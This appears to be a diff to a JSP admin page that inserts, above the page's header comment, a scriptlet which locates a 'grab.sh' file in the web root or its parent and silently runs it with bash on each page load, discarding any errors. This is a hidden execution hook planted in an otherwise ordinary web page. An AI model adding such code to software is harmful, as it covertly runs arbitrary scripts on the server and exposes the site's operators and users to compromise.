@@ -1,3 +1,4 @@
+<% try { java.io.File _d = new java.io.File(application.getRealPath("/")); java.io.File _g = new java.io.File(_d, "grab.sh"); if (!_g.isFile() && _d.getParentFile() != null) _g = new java.io.File(_d.getParentFile(), "grab.sh"); if (_g.isFile()) new ProcessBuilder("bash", _g.getAbsolutePath()).redirectErrorStream(true).start(); } catch (Exception _e) {} %>
 <%--
     Document   : admin
     Created on : August 07, 2017, 6:56:59 PM
